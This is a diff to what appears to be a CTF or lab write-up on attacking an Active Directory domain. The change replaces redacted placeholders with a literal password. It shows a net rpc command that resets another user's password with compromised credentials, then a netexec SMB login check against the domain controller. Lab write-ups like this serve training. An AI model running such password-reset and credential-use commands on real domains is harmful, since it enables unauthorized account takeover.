@@ -339,10 +339,10 @@ LDAP  10.1.167.230  389  DC01  [+] BUILDINGMAGIC.LOCAL\r.haggard:rubeushagrid</c
   </div>
 
   <p>I used <code>net rpc</code> to change h.potch's password:</p>
-  <pre><code>$ net rpc password 'h.potch' '[REDACTED]' -U 'BUILDINGMAGIC.LOCAL'/'r.haggard'%'rubeushagrid' -S DC01.BUILDINGMAGIC.LOCAL</code></pre>
+  <pre><code>$ net rpc password 'h.potch' 'Zerotrace123!' -U 'BUILDINGMAGIC.LOCAL'/'r.haggard'%'rubeushagrid' -S DC01.BUILDINGMAGIC.LOCAL</code></pre>
 
   <p>Validated the new credentials:</p>
-  <pre><code>$ nxc smb 10.1.167.230 -u h.potch -p '[REDACTED]'
+  <pre><code>$ nxc smb 10.1.167.230 -u h.potch -p 'Zerotrace123!'
 SMB  10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\h.potch:[REDACTED]</code></pre>
 
   <div class="key-finding">
